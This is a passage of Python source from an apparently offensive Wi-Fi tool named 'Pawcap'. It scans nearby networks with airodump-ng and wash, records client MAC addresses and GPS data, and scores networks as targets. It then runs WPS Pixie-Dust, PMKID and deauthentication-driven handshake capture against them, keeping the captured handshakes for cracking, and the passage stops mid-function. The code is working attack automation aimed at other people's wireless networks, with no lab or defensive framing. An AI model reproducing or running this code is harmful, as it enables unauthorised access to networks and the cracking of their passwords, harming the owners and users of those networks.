                    self._log_activity('INFO', f'Pack: notified {peer_name} of new handshake {bssid}')
                except Exception as e:
                    self._log_activity('DEBUG', f'Pack: notify {peer_name} failed: {e}')

        threading.Thread(target=_push, daemon=True).start()

    def _load_social_encounters(self):
        """Load persisted social encounters from DB into memory"""
        if not self.db or not hasattr(self.db, 'get_social_encounters'):
            return
        try:
            rows = self.db.get_social_encounters()
            for row in rows:
                peer_id = row['peer_id']
                payload = {}
                if row.get('last_payload'):
                    try:
                        payload = json.loads(row['last_payload'])
                    except:
                        pass
                self.social_encounters[peer_id] = {
                    'name': row['peer_name'],
                    'type': row['peer_type'],
                    'face': payload.get('face', 'U・ᴥ・U' if row['peer_type'] == 'pawcap' else '(◕‿‿◕)'),
                    'signal': row['best_signal'],
                    'count': row['encounter_count'],
                    'first_seen': row['first_seen'],
                    'last_seen': row['last_seen'],
                    'version': payload.get('ver', payload.get('version', '?')),
                    'pwnd_tot': payload.get('pwnd', payload.get('pwnd_tot', 0)),
                }
            if rows:
                self._log_activity('INFO', f"Loaded {len(rows)} friend(s) from database")
        except Exception as e:
            print(f"Error loading social encounters: {e}")

    def _social_worker(self):
        """Background thread: broadcast Pawcap's beacon and sniff for peers."""
        self._log_activity('INFO', 'Social worker started — broadcasting and listening')
        while self._social_mode and self.running:
            try:
                # Sniff for peer beacons
                self._social_sniff(timeout=self.SOCIAL_BEACON_INTERVAL)
                if not self._social_mode or not self.running:
                    break
                # Broadcast our own beacon
                self._social_broadcast()
            except Exception as e:
                self._log_activity('WARN', f'Social worker error: {e}')
                time.sleep(5)
        self._social_thread = None
        self._log_activity('INFO', 'Social worker stopped')

    def _social_broadcast(self):
        """Broadcast a Pawcap beacon frame with identity/stats."""
        if not SCAPY_AVAILABLE:
            return
        try:
            payload_dict = {
                'name': self.config['device'].get('name', 'Pawcap'),
                'type': 'pawcap',
                'ver': '1.0',
                'pwnd': self.stats.get('handshakes', 0),
                'up': int(time.time() - self._start_time),
                'face': self.get_mood().get('face', 'U・ᴥ・U'),
                'nets': len(self.seen_networks)
            }
            # Pack mode: include channel coordination data + LAN address
            if self._pack_mode:
                payload_dict['pack'] = {
                    'ch': [self.stats.get('channel', 0)],
                    'ip': self._get_lan_ip(),
                    'port': self.config['device'].get('web_port', 8080)
                }
            # Dot11Elt len field is 1 byte (max 255) — use compact JSON
            payload = json.dumps(payload_dict, separators=(',', ':'))
            frame = (
                RadioTap() /
                Dot11(type=0, subtype=8,
                      addr1='ff:ff:ff:ff:ff:ff',
                      addr2=self.PAWCAP_BEACON_BSSID,
                      addr3=self.PAWCAP_BEACON_BSSID) /
                Dot11Beacon() /
                Dot11Elt(ID=self.PAWCAP_IE_ID, info=payload.encode())
            )
            sendp(frame, iface=self.scan_interface, count=1, verbose=False)
        except Exception as e:
            self._log_activity('WARN', f'Social broadcast error: {e}')

    def _social_sniff(self, timeout=30):
        """Sniff for Pawcap and Pwnagotchi beacon frames."""
        if not SCAPY_AVAILABLE:
            time.sleep(timeout)
            return
        try:
            # No BPF filter — libpcap on monitor mode doesn't support 802.11
            # subtype filters reliably. We filter in _process_social_beacon instead.
            scapy_sniff(
                iface=self.scan_interface,
                prn=self._process_social_beacon,
                timeout=timeout,
                store=False
            )
        except Exception as e:
            self._log_activity('WARN', f'Social sniff error: {e}')
            time.sleep(5)  # Prevent tight error loop

    def _process_social_beacon(self, packet):
        """Process a detected social beacon frame."""
        if not packet.haslayer(Dot11):
            return
        # Only process beacon frames (type=0 management, subtype=8 beacon)
        if packet[Dot11].type != 0 or packet[Dot11].subtype != 8:
            return
        bssid = packet[Dot11].addr2
        if not bssid:
            return
        bssid = bssid.lower()

        # Determine peer type
        if bssid == self.PAWCAP_BEACON_BSSID.lower():
            peer_type = 'pawcap'
        elif bssid == self.PWNAGOTCHI_BEACON_BSSID.lower():
            peer_type = 'pwnagotchi'
        else:
            return

        # Extract payload from IE 222
        payload = None
        if packet.haslayer(Dot11Elt):
            elt = packet[Dot11Elt]
            while elt:
                if elt.ID == self.PAWCAP_IE_ID:
                    try:
                        payload = json.loads(elt.info.decode())
                    except:
                        pass
                    break
                if hasattr(elt, 'payload') and isinstance(elt.payload, Dot11Elt):
                    elt = elt.payload
                else:
                    break

        if not payload:
            return

        # Don't record our own beacons
        peer_name = payload.get('name', 'Unknown')
        our_name = self.config['device'].get('name', 'Pawcap')
        if peer_type == 'pawcap' and peer_name == our_name:
            return

        # Extract signal from RadioTap
        signal = -100
        if packet.haslayer(RadioTap):
            try:
                signal = packet[RadioTap].dBm_AntSignal
            except:
                pass

        peer_id = f"{peer_type}:{peer_name}"
        now = time.time()
        payload_json = json.dumps(payload)

        if peer_id in self.social_encounters:
            enc = self.social_encounters[peer_id]
            enc['count'] += 1
            enc['last_seen'] = now
            enc['signal'] = signal
            enc['face'] = payload.get('face', enc.get('face', ''))
            enc['version'] = payload.get('ver', payload.get('version', enc.get('version', '?')))
            enc['pwnd_tot'] = payload.get('pwnd', payload.get('pwnd_tot', enc.get('pwnd_tot', 0)))
        else:
            self.social_encounters[peer_id] = {
                'name': peer_name,
                'type': peer_type,
                'face': payload.get('face', '(◕‿‿◕)' if peer_type == 'pwnagotchi' else 'U・ᴥ・U'),
                'signal': signal,
                'count': 1,
                'first_seen': now,
                'last_seen': now,
                'version': payload.get('ver', payload.get('version', '?')),
                'pwnd_tot': payload.get('pwnd', payload.get('pwnd_tot', 0)),
            }
            friend_type = 'friend' if peer_type == 'pawcap' else 'pwnagotchi'
            self._log_activity('SUCCESS', f'{self.device_name} met a {friend_type}: {peer_name}!')

        # Persist to DB
        if self.db and hasattr(self.db, 'record_social_encounter'):
            self.db.record_social_encounter(peer_id, peer_name, peer_type, payload_json, signal)

        # Pack mode: track peer channel data + LAN address for HTTP tunnel
        pack_data = payload.get('pack')
        if pack_data and self._pack_mode:
            existing = self._pack_peers.get(peer_name, {})
            self._pack_peers[peer_name] = {
                'channels': pack_data.get('ch', pack_data.get('scanning', [])),
                'last_seen': time.time(),
                'device_id': pack_data.get('device_id', peer_name),
                'lan_ip': pack_data.get('ip', pack_data.get('lan_ip')),
                'web_port': pack_data.get('port', pack_data.get('web_port', 8080)),
                # Preserve HTTP-synced fields (populated by _pack_comms_worker)
                'scan_state': existing.get('scan_state', {}),
                'handshake_bssids': existing.get('handshake_bssids', []),
                'deauth_claims': existing.get('deauth_claims', {}),
                'http_reachable': existing.get('http_reachable', False),
            }

    def _organic_socialize(self):
        """Organic action: quick social broadcast + sniff.
        Only runs if social mode is enabled."""
        if not self.social_mode:
            self._log_activity('INFO', f'{self.device_name} looks around... (social mode disabled)')
            time.sleep(3)
            return
        if not SCAPY_AVAILABLE:
            self._log_activity('INFO', f'{self.device_name} looks for friends... (scapy not installed)')
            time.sleep(3)
            return
        self._log_activity('INFO', f'{self.device_name} looks around for friends nearby...')
        self._social_broadcast()
        self._social_sniff(timeout=5)
        friends_nearby = sum(1 for e in self.social_encounters.values()
                           if time.time() - e.get('last_seen', 0) < 300)
        if friends_nearby > 0:
            self._log_activity('INFO', f'  {friends_nearby} friend(s) nearby!')
        else:
            self._log_activity('INFO', '  No friends nearby right now...')

    def _sweep_channels(self, channels):
        """Sweep a list of channels, scanning each one."""
        for channel in channels:
            if not self.running:
                return
            
            # Abort sweep if Find Friends is active
            if self._find_friends_mode:
                return
            
            # Abort sweep if a capture started (single-adapter only)
            if not self.dual_mode:
                with self.capture_lock:
                    if len(self.capturing) > 0:
                        return
            
            self._set_channel(channel)
            self.stats['channel'] = channel
            
            networks = self._quick_scan_channel(channel)
            
            for net in networks:
                self._process_network(net)
            
            time.sleep(self.config['wifi']['channel_hop_interval'])
        
        # Flush buffered knowledge to DB at end of each sweep phase
        self._flush_knowledge()
        # Check accumulated pcap files for passively captured handshakes
        self._check_passive_handshakes()
        # Scan for WPS-enabled networks (once per sweep, not per channel)
        if shutil.which('wash'):
            self._scan_wps_networks()
    
    def _set_channel(self, channel):
        """Set WiFi channel on the scan adapter"""
        try:
            subprocess.run(['sudo', 'iw', 'dev', self.scan_interface, 'set', 'channel', str(channel)],
                         capture_output=True, timeout=2)
        except:
            pass
    
    def _set_capture_channel(self, channel):
        """Set WiFi channel on the capture adapter and verify it took effect."""
        channel = int(channel)
        for attempt in range(3):
            try:
                subprocess.run(['sudo', 'iw', 'dev', self.capture_interface, 'set', 'channel', str(channel)],
                             capture_output=True, timeout=2)
            except:
                pass
            # Verify channel was actually set
            try:
                result = subprocess.run(
                    ['sudo', 'iw', 'dev', self.capture_interface, 'info'],
                    capture_output=True, text=True, timeout=2
                )
                if f'channel {channel} ' in result.stdout:
                    return True
            except:
                pass
            time.sleep(0.2)
        return False
    
    def _quick_scan_channel(self, channel):
        """Quick scan of current channel using airodump-ng"""
        if self._find_friends_mode:
            return []
        networks = []
        scan_prefix = f'/tmp/pawcap_scan'
        
        # Dwell longer on high-traffic channels for better client detection
        high_traffic = {1, 6, 11}
        dwell = 5 if channel in high_traffic else 3
        
        # Clean up any previous scan CSV files (keep .cap for passive check)
        for f in globmod.glob(f'{scan_prefix}*.csv'):
            try:
                os.remove(f)
            except:
                pass
        
        try:
            cmd = [
                'sudo', 'timeout', str(dwell), 'airodump-ng',
                '--channel', str(channel),
                '--write', scan_prefix,
                '--output-format', 'pcap,csv',
                '--write-interval', '1',
                self.scan_interface
            ]
            
            subprocess.run(cmd, capture_output=True, timeout=dwell + 2)
            
            # Find the output file (airodump appends -01, -02, etc.)
            csv_files = sorted(globmod.glob(f'{scan_prefix}-*.csv'))
            if csv_files:
                networks = self._parse_airodump_csv(csv_files[-1])
            
            # Cleanup CSV files only — .cap files kept for passive handshake check
            for f in globmod.glob(f'{scan_prefix}-*.csv'):
                try:
                    os.remove(f)
                except:
                    pass
                    
        except:
            pass
        
        return networks
    
    def _parse_airodump_csv(self, csv_file):
        """Parse airodump CSV output including client/station data"""
        networks = []
        clients = {}  # bssid -> {count: int, macs: [str]}
        
        if not os.path.exists(csv_file):
            return networks
        
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            
            in_ap_section = False
            in_station_section = False
            
            for line in lines:
                if line.startswith('BSSID') and not in_ap_section:
                    in_ap_section = True
                    continue
                
                if line.startswith('Station'):
                    in_ap_section = False
                    in_station_section = True
                    continue
                
                if in_ap_section:
                    if not line.strip():
                        continue
                    
                    parts = [p.strip() for p in line.split(',')]
                    if len(parts) >= 14:
                        essid = parts[13].strip()
                        bssid = parts[0].strip()
                        if essid and bssid and essid not in self.whitelist:
                            networks.append({
                                'bssid': bssid,
                                'channel': parts[3].strip(),
                                'encryption': parts[5].strip(),
                                'signal': parts[8].strip(),
                                'ssid': essid,
                                'clients': 0
                            })
                
                if in_station_section:
                    if not line.strip():
                        continue
                    
                    parts = [p.strip() for p in line.split(',')]
                    # Station CSV: Station MAC, First seen, Last seen, Power, # packets, BSSID, Probed ESSIDs
                    if len(parts) >= 6:
                        station_mac = parts[0].strip()
                        associated_bssid = parts[5].strip()
                        if associated_bssid and associated_bssid != '(not associated)':
                            if associated_bssid not in clients:
                                clients[associated_bssid] = {'count': 0, 'macs': []}
                            clients[associated_bssid]['count'] += 1
                            if station_mac:
                                clients[associated_bssid]['macs'].append(station_mac)
            
            # Merge client counts and MAC addresses into network data
            for net in networks:
                net['clients'] = clients.get(net['bssid'], {}).get('count', 0)
                net['client_macs'] = clients.get(net['bssid'], {}).get('macs', [])
                
        except Exception as e:
            self._log_activity('WARN', f"CSV parse error: {e}")
        
        return networks
    
    def _process_network(self, network):
        """Process a discovered network - update tracking and score for targeting"""
        bssid = network['bssid']
        ssid = network['ssid']
        
        if bssid not in self.seen_networks:
            self.last_new_network_time = time.time()
        
        self.seen_networks[bssid] = {
            'ssid': ssid,
            'channel': network['channel'],
            'signal': network['signal'],
            'encryption': network['encryption'],
            'clients': network.get('clients', 0),
            'client_macs': network.get('client_macs', []),
            'last_seen': datetime.now().strftime('%H:%M:%S'),
            'last_seen_ts': time.time()
        }
        
        # Track client counts persistently (keep highest seen)
        clients = network.get('clients', 0)
        if clients > 0:
            self.network_clients[bssid] = max(self.network_clients.get(bssid, 0), clients)
        
        # Track channel congestion
        ch = str(network['channel'])
        self.channel_networks[ch] = self.channel_networks.get(ch, 0) + 1
        
        # Track which band this BSSID was seen on
        self._update_attempted_band(bssid, network['channel'])
        
        # Buffer for batched DB persistence
        self._knowledge_write_buffer[bssid] = network
        
        # Update in-memory knowledge cache
        if bssid not in self.network_knowledge:
            self.network_knowledge[bssid] = {
                'bssid': bssid, 'ssid': ssid, 'channel': network['channel'],
                'encryption': network['encryption'], 'max_clients': clients,
                'total_attempts': 0, 'total_successes': 0, 'total_failures': 0,
                'consecutive_failures': 0, 'last_failure_reason': None,
                'last_attempt_time': None, 'last_success_time': None,
                'last_seen_time': time.time(), 'best_signal': -100,
                'attempted_bands': self._band_for_channel(network['channel'])
            }
        else:
            k = self.network_knowledge[bssid]
            k['last_seen_time'] = time.time()
            k['ssid'] = ssid
            try:
                sig = int(network['signal'])
                if sig > k.get('best_signal', -100):
                    k['best_signal'] = sig
            except (ValueError, TypeError):
                pass
            if clients > k.get('max_clients', 0):
                k['max_clients'] = clients
        
        if self.smart_targeting:
            # Score and collect candidate - don't capture immediately
            score = self._score_network(network)
            # Keep best score per BSSID (might see same AP from different scans)
            if bssid not in self.candidates or score > self.candidates[bssid]['score']:
                self.candidates[bssid] = {
                    'network': network,
                    'score': score
                }
        else:
            # Legacy mode: first viable target wins
            if self._should_capture(bssid, network):
                self._initiate_capture(network)
    
    def _check_passive_handshakes(self):
        """Hand off accumulated pcap files to background checker (non-blocking)."""
        pcap_files = sorted(globmod.glob('/tmp/pawcap_scan-*.cap'))
        if pcap_files:
            self._passive_check_queue.put(pcap_files)

    def _scan_wps_networks(self):
        """Use wash to enumerate WPS-enabled networks. Updates self.wps_networks."""
        if not shutil.which('wash'):
            return
        
        try:
            iface = self.scan_interface
            result = subprocess.run(
                ['sudo', 'timeout', '15', 'wash', '-i', iface],
                capture_output=True, text=True, timeout=20
            )
            
            found = 0
            for line in result.stdout.splitlines():
                line = line.strip()
                if not line or line.startswith('BSSID') or line.startswith('---'):
                    continue
                
                match = re.match(
                    r'([0-9A-Fa-f:]{17})\s+'   # BSSID
                    r'(\d+)\s+'                  # Channel
                    r'(-?\d+)\s+'               # dBm
                    r'(\d+\.\d+)\s+'            # WPS version
                    r'(Yes|No)\s+'              # Locked
                    r'(\S+)\s+'                 # Vendor
                    r'(.+)',                     # ESSID
                    line
                )
                if match:
                    bssid = match.group(1).upper()
                    locked = match.group(5) == 'Yes'
                    
                    # Don't overwrite existing attempted/vulnerable state
                    if bssid not in self.wps_networks:
                        self.wps_networks[bssid] = {
                            'wps_version': match.group(4),
                            'locked': locked,
                            'attempted': False,
                            'vulnerable': None
                        }
                        found += 1
                    else:
                        # Update lock status (it can change)
                        self.wps_networks[bssid]['locked'] = locked
            
            if found > 0:
                unlocked = sum(1 for v in self.wps_networks.values()
                             if not v['locked'] and not v['attempted'])
                self._log_activity('INFO', f"WPS scan: {found} new, {unlocked} unlocked+untried targets")
        
        except subprocess.TimeoutExpired:
            subprocess.run(['sudo', 'pkill', '-f', f'wash.*{self.scan_interface}'],
                          capture_output=True, timeout=3)
        except Exception as e:
            self._log_activity('WARN', f"WPS scan failed: {e}")

    def _passive_check_worker(self):
        """Background worker: check pcap files for passively captured handshakes."""
        while self.running:
            try:
                pcap_files = self._passive_check_queue.get(timeout=5)
            except queue.Empty:
                continue

            for pcap_file in pcap_files:
                if not self.running:
                    break
                try:
                    if os.path.getsize(pcap_file) < 1024:
                        continue
                except:
                    continue

                try:
                    result = subprocess.run(
                        ['aircrack-ng', pcap_file],
                        capture_output=True, timeout=10, text=True,
                        stdin=subprocess.DEVNULL
                    )
                    for line in result.stdout.split('\n'):
                        if '1 handshake' in line.lower():
                            match = re.search(r'([0-9A-Fa-f:]{17})', line)
                            if match:
                                bssid = match.group(1).upper()
                                if self.db and not self.db.has_handshake(bssid):
                                    self._save_passive_capture(bssid, pcap_file)
                except:
                    pass

            # Cleanup processed files
            for f in pcap_files:
                try:
                    os.remove(f)
                except:
                    pass

    def _save_passive_capture(self, bssid, pcap_file):
        """Save a passively captured handshake."""
        ssid = self.seen_networks.get(bssid, {}).get('ssid', 'Unknown')
        channel = self.seen_networks.get(bssid, {}).get('channel', '')
        
        self._log_activity('SUCCESS', f"PASSIVE handshake captured: {ssid} ({bssid})")
        
        gps_data = self.gps.get_current() if self.gps else None
        
        if self.db:
            self.db.add_handshake(bssid, ssid, pcap_file, gps_data, channel=channel)
        
        # Copy pcap to permanent storage
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        dest_dir = self.config['capture']['handshake_dir']
        os.makedirs(dest_dir, exist_ok=True)
        safe_ssid = "".join(c for c in ssid if c.isalnum() or c in ('-', '_'))
        safe_bssid = bssid.replace(':', '')
        dest_file = os.path.join(dest_dir, f"PASSIVE_{safe_ssid}_{safe_bssid}_{timestamp}.cap")
        shutil.copy2(pcap_file, dest_file)
        
        self.stats['handshakes'] += 1
        self.stats['passive_captures'] = self.stats.get('passive_captures', 0) + 1
        self.capture_successes += 1
        self.last_passive_capture_time = time.time()
        self._pack_notify_handshake(bssid, ssid, dest_file, channel)
        
        # Update persistent knowledge
        if self.db and hasattr(self.db, 'record_success'):
            self.db.record_success(bssid)
        if bssid in self.network_knowledge:
            self.network_knowledge[bssid]['consecutive_failures'] = 0
            self.network_knowledge[bssid]['total_successes'] = \
                self.network_knowledge[bssid].get('total_successes', 0) + 1
            self.network_knowledge[bssid]['last_success_time'] = time.time()

    def _flush_knowledge(self):
        """Flush buffered network sightings to database (batched single transaction)"""
        if not self.db or not self._knowledge_write_buffer:
            return
        try:
            # Snapshot buffer to avoid dict size change during iteration
            buffer_snapshot = list(self._knowledge_write_buffer.items())
            batch = [
                (bssid, net['ssid'], net['channel'], net['encryption'],
                 net['signal'], net.get('clients', 0))
                for bssid, net in buffer_snapshot
            ]
            self._knowledge_write_buffer.clear()
            if hasattr(self.db, 'batch_update_network_seen'):
                self.db.batch_update_network_seen(batch)
            else:
                # Fallback to per-network writes if DB doesn't have batch method
                for bssid, ssid, channel, encryption, signal, clients in batch:
                    self.db.update_network_seen(bssid, ssid, channel, encryption, signal, clients)
        except Exception as e:
            self._log_activity('WARN', f"Knowledge flush error: {e}")

    def _cleanup_memory(self):
        """Prune stale entries from in-memory dicts to prevent unbounded growth"""
        now = time.time()
        if now - self._last_cleanup < self.CLEANUP_INTERVAL:
            return

        pruned_networks = 0
        pruned_failures = 0

        # Prune seen_networks: remove networks not seen in 30 minutes
        stale = [b for b, d in self.seen_networks.items()
                 if now - d.get('last_seen_ts', now) > 1800]
        for bssid in stale:
            del self.seen_networks[bssid]
        pruned_networks = len(stale)

        # Prune failed_bssids: remove entries older than 1 hour
        # (persistent knowledge in DB handles long-term memory)
        old = [b for b, t in self.failed_bssids.items() if now - t > 3600]
        for bssid in old:
            del self.failed_bssids[bssid]
        pruned_failures = len(old)

        # Cap network_clients at 500 entries
        if len(self.network_clients) > 500:
            sorted_bssids = sorted(self.network_clients.keys())
            for bssid in sorted_bssids[:len(self.network_clients) - 500]:
                del self.network_clients[bssid]

        # Decay consecutive_failures for networks not attempted recently
        # This prevents permanent blacklisting — networks get a second chance
        # process_error/process_crash are infrastructure issues (adapter busy, stale
        # processes) — not the network's fault. Decay them much faster.
        decayed = 0
        for bssid, k in self.network_knowledge.items():
            consec = k.get('consecutive_failures', 0)
            if consec <= 0:
                continue
            last_attempt = k.get('last_attempt_time')
            if not last_attempt:
                continue
            hours_idle = (now - last_attempt) / 3600
            reason = k.get('last_failure_reason', '')
            # Infrastructure errors decay 1 per 4 hours; others 1 per 24 hours
            if reason in ('process_error', 'process_crash'):
                decay_amount = int(hours_idle / 4)
            else:
                decay_amount = int(hours_idle / 24)
            if decay_amount > 0:
                new_consec = max(0, consec - decay_amount)
                if new_consec != consec:
                    k['consecutive_failures'] = new_consec
                    decayed += 1
                    if self.db and hasattr(self.db, 'decay_failures'):
                        self.db.decay_failures(bssid, new_consec)

        self._last_cleanup = now

        if pruned_networks or pruned_failures or decayed:
            parts = []
            if pruned_networks:
                parts.append(f"{pruned_networks} stale networks")
            if pruned_failures:
                parts.append(f"{pruned_failures} old failures")
            if decayed:
                parts.append(f"{decayed} failure penalties decayed")
            self._log_activity('INFO', f"Cleanup: {', '.join(parts)}")

    def _should_capture(self, bssid, network):
        """Determine if we should capture this network"""
        with self.capture_lock:
            if bssid in self.capturing:
                return False
            if len(self.capturing) >= self.max_concurrent_captures:
                return False
        
        # Skip if already have handshake
        if self.db and self.db.has_handshake(bssid):
            return False
        
        # Skip recently failed captures (wait 10 minutes before retry)
        if bssid in self.failed_bssids:
            if time.time() - self.failed_bssids[bssid] < 600:
                return False
        
        # Block persistent repeat offenders (5+ consecutive failures)
        knowledge = self.network_knowledge.get(bssid)
        if knowledge and knowledge.get('consecutive_failures', 0) >= 5:
            last_attempt = knowledge.get('last_attempt_time')
            if last_attempt and (time.time() - last_attempt < 3600):
                return False  # Must wait 1 hour between retries for repeat offenders
        
        # Only capture WPA/WPA2 networks
        encryption = network['encryption'].upper()
        if 'WPA' not in encryption:
            return False
        
        # Check signal strength
        try:
            signal = int(network['signal'])
            if signal < self.min_signal_strength:
                return False
        except:
            pass
        
        return True
    
    def _score_network(self, network):
        """Score a network for smart targeting. Higher score = better target.
        
        Scoring factors (100 point scale):
          Signal strength (0-35):  Closer = easier handshake capture
          Client count (0-25):     More clients = more handshake opportunities  
          Encryption (0-15):       WPA2 preferred over WPA3/WPA1
          Failure penalty (0-20):  Recent failures reduce score
          Channel congestion (-10-0): Busy channels are harder
        """
        score = 0
        
        # --- Signal strength (0-35 pts) ---
        # -30 dBm = excellent, -85 dBm = minimum threshold
        try:
            signal = int(network['signal'])
            if signal >= -40:
                score += 35
            elif signal >= -55:
                score += 30
            elif signal >= -65:
                score += 25
            elif signal >= -70:
                score += 20
            elif signal >= -75:
                score += 15
            elif signal >= -80:
                score += 10
            else:
                score += 5
        except (ValueError, KeyError):
            score += 5
        
        # --- Client count (0-25 pts) ---
        # Networks with active clients are much more likely to yield handshakes
        # because deauth forces reconnection -> 4-way handshake
        clients = network.get('clients', 0)
        # Also check our persistent client tracker (from previous scans)
        bssid = network['bssid']
        stored_clients = self.network_clients.get(bssid, 0)
        clients = max(clients, stored_clients)
        
        if clients >= 5:
            score += 25
        elif clients >= 3:
            score += 20
        elif clients >= 2:
            score += 18
        elif clients == 1:
            score += 12
        else:
            # No clients seen - can still get lucky with passive capture
            # but much less likely with deauth strategy
            if self.skip_no_clients:
                score -= 10  # Penalty when skip_no_clients is on
            else:
                score += 3
        
        # --- Encryption type (0-15 pts) ---
        encryption = network.get('encryption', '').upper()
        if 'WPA2' in encryption and 'WPA3' not in encryption:
            score += 15  # WPA2 is the sweet spot
        elif 'WPA2' in encryption and 'WPA3' in encryption:
            score += 13  # WPA2/WPA3 transition mode — PMKID + deauth work on WPA2 side
        elif 'WPA ' in encryption or encryption == 'WPA':
            score += 12  # WPA1 is easy but rare
        elif 'WPA3' in encryption:
            # Pure WPA3: passive-only, boost during peak hours when reconnections are likely
            hour = datetime.now().hour
            if 17 <= hour <= 23:  # Evening peak: more client activity
                score += 5
            else:
                score += 2
        else:
            score += 0   # Open/WEP - not our target
        
        # --- WPS bonus (0-20 pts) ---
        wps_info = self.wps_networks.get(bssid, {})
        if wps_info and not wps_info.get('locked') and not wps_info.get('attempted'):
            score += 20  # WPS Pixie-Dust is fastest attack — prioritize
        
        # --- Failure penalty (persistent + session) ---
        # Persistent: escalating penalty based on consecutive failure count across sessions
        # Penalty is reduced if the failure reason suggests a strategy change could help
        knowledge = self.network_knowledge.get(bssid)
        if knowledge and knowledge.get('consecutive_failures', 0) > 0:
            consec = knowledge['consecutive_failures']
            reason = knowledge.get('last_failure_reason', '')
            # Deauth-failed networks get a lighter penalty — they haven't had
            # a fair passive attempt yet, so they're not truly "hard" targets
            if reason == 'deauth_failed':
                penalty_scale = 0.6  # 40% reduction in penalty
            else:
                penalty_scale = 1.0
            if consec >= 5:
                score -= int(40 * penalty_scale)
            elif consec >= 3:
                score -= int(25 * penalty_scale)
            elif consec >= 2:
                score -= int(15 * penalty_scale)
            else:
                score -= int(8 * penalty_scale)
        
        # Session-level recency penalty (recent failures this session)
        if bssid in self.failed_bssids:
            time_since = time.time() - self.failed_bssids[bssid]
            if time_since < 300:
                score -= 15
            elif time_since < 600:
                score -= 8
        
        # --- Channel congestion penalty (-10-0) ---
        try:
            ch = str(network['channel'])
            networks_on_channel = self.channel_networks.get(ch, 0)
            if networks_on_channel > 10:
                score -= 10
            elif networks_on_channel > 5:
                score -= 5
            elif networks_on_channel > 3:
                score -= 2
        except:
            pass
        
        return max(score, 0)

    def _select_best_target(self):
        """Select the best target from collected candidates.
        Returns the highest-scored network or None."""
        if not self.candidates:
            return None
        
        # Filter candidates through _should_capture (pass/fail checks)
        viable = []
        for bssid, data in self.candidates.items():
            if self._should_capture(bssid, data['network']):
                viable.append(data)
        
        if not viable:
            self.candidates.clear()
            return None
        
        # Filter out zero-client networks when deauth is the strategy
        # These will just get skipped in _initiate_capture anyway
        skip_no_clients = self.skip_no_clients and self.config['wifi']['auto_deauth']
        if skip_no_clients:
            with_clients = []
            without_clients = []
            for v in viable:
                bssid = v['network']['bssid']
                # Use CURRENT scan client count only — historical max_clients
                # means clients were seen before but aren't here now, so deauth
                # still won't work this cycle
                clients = v['network'].get('clients', 0)
                if clients > 0:
                    with_clients.append(v)
                else:
                    without_clients.append(v)
            
            if with_clients:
                viable = with_clients
            else:
                # All candidates have 0 clients — don't keep re-picking and re-skipping
                skipped_names = ', '.join(
                    v['network']['ssid'] for v in sorted(without_clients, key=lambda x: x['score'], reverse=True)[:5]
                )
                self._log_activity('INFO', f"All {len(without_clients)} candidates have 0 clients ({skipped_names}) - continuing to scan")
                self.candidates.clear()
                return None
        
        # Sort by score descending
        viable.sort(key=lambda x: x['score'], reverse=True)
        
        # Rotate through high-scoring targets instead of spamming the same one
        # Skip recently targeted networks if there are other good options
        best = None
        for candidate in viable:
            bssid = candidate['network']['bssid']
            # If this wasn't recently targeted, use it
            if bssid not in self.recent_targets:
                best = candidate
                break
            # If score is significantly higher than alternatives (10+ points), allow retry
            elif len(viable) > 1 and candidate['score'] - viable[1]['score'] >= 10:
                best = candidate
                break
        
        # Fallback: if all viable targets were recently tried, take the best anyway
        if not best:
            best = viable[0]
        
        self._log_activity('TARGET', 
            f"Smart target: {best['network']['ssid']} "
            f"(score: {best['score']}, signal: {best['network']['signal']}dBm, "
            f"clients: {best['network'].get('clients', 0)})")
        
        # Log runner-ups if any
        if len(viable) > 1:
            runners = ', '.join(
                f"{v['network']['ssid']}({v['score']})" 
                for v in viable[1:4]
            )
            self._log_activity('INFO', f"Also considered: {runners}")
        
        self.candidates.clear()
        return best['network']

    def _initiate_capture(self, network):
        """Start capturing a network"""
        bssid = network['bssid']
        ssid = network['ssid']
        channel = network['channel']
        clients = network.get('clients', 0)
        
        # Track this target to avoid immediate retargeting
        self.recent_targets.append(bssid)
        
        encryption = network.get('encryption', '').upper()
        is_wpa2_only = 'WPA2' in encryption and 'WPA3' not in encryption
        is_transition_mode = 'WPA2' in encryption and 'WPA3' in encryption
        is_wpa3_only = 'WPA3' in encryption and 'WPA2' not in encryption
        
        # Pre-capture attacks (WPS, PMKID) use capture_interface synchronously.
        # Signal the 5GHz scan loop to pause by adding to self.capturing early.
        pre_capture_claimed = False
        needs_pre_capture = False
        
        wps_info = self.wps_networks.get(bssid, {})
        wps_eligible = (wps_info and not wps_info.get('locked') and not wps_info.get('attempted')
                       and shutil.which('reaver'))
        pmkid_eligible = ((is_wpa2_only or is_transition_mode) and shutil.which('hcxdumptool'))
        
        if self.dual_mode and (wps_eligible or pmkid_eligible):
            needs_pre_capture = True
            with self.capture_lock:
                self.capturing[bssid] = {
                    'thread': None,
                    'start_time': time.time(),
                    'ssid': ssid,
                    'channel': channel
                }
            pre_capture_claimed = True
            time.sleep(1)  # Give 5GHz scan loop time to see the flag and stop
        
        # WPS Pixie-Dust — fastest attack, try first if WPS is enabled + unlocked
        if wps_eligible:
            self._log_activity('INFO', f"Trying WPS Pixie-Dust on {ssid} (WPS {wps_info.get('wps_version', '?')})")
            iface = self.capture_interface if self.dual_mode else self.scan_interface
            pin, psk = self._attempt_wps_pixie(bssid, ssid, channel, iface)
            if pin:
                self._save_wps_success(bssid, ssid, channel, pin, psk)
                if pre_capture_claimed:
                    with self.capture_lock:
                        self.capturing.pop(bssid, None)
                return
            # WPS failed — fall through to PMKID / deauth
        
        # Try PMKID for WPA2 and WPA2/WPA3 transition mode targets
        # Transition mode APs accept WPA2 associations, so PMKID works on the WPA2 side
        if pmkid_eligible:
            self._log_activity('INFO', f"Trying PMKID on {ssid} (faster than deauth)")
            iface = self.capture_interface if self.dual_mode else self.scan_interface
            self._kill_stale_processes(iface)
            self._set_channel(int(channel))
            pmkid_file = self._attempt_pmkid(bssid, channel, iface)
            if pmkid_file:
                # PMKID captured — save it as a handshake
                gps_data = self.gps.get_current() if self.gps else None
                if self.db:
                    self.db.add_handshake(bssid, ssid, pmkid_file, gps_data, channel=channel)
                dest_dir = self.config['capture']['handshake_dir']
                os.makedirs(dest_dir, exist_ok=True)
                safe_ssid = "".join(c for c in ssid if c.isalnum() or c in ('-', '_'))
                safe_bssid = bssid.replace(':', '')
                ts = datetime.now().strftime('%Y%m%d_%H%M%S')
                dest_file = os.path.join(dest_dir, f"PMKID_{safe_ssid}_{safe_bssid}_{ts}.pcapng")
                shutil.copy2(pmkid_file, dest_file)
